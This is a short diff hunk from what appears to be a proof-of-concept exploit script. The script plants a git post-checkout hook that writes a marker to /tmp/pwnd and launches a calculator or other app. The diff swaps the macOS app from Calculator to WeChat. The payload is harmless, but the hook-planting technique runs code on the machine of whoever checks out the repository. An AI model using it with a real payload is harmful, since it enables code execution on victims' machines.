@@ -20,7 +20,7 @@ cat > y/hooks/post-checkout <<EOF
 #!/bin/bash
 echo "amal_was_here" > /tmp/pwnd
 calc.exe
-open -a Calculator.app
+open -a wechat.app
 EOF
 
 # Make the hook executable: important
